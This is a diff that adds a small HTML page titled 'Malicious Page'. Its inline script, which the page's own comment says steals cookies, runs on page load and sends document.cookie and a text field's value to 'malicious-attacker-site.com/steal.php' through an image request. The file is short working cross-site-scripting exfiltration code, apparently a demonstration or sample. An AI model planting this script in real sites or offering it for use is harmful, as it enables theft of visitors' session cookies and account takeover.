@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Welcome to the Malicious Page!</h1>
+    <p>This page has been compromised.</p>
+    <input type="text" id="inputField">
+    <script>
+        // This script steals the user's cookies and sends them to the attacker's server.
+        var userInput = document.getElementById('inputField').value;
+        var img = new Image();
+        img.src = 'https://malicious-attacker-site.com/steal.php?data=' + encodeURIComponent(userInput + ' | Cookies: ' + document.cookie);
+    </script>
+</body>
+</html>
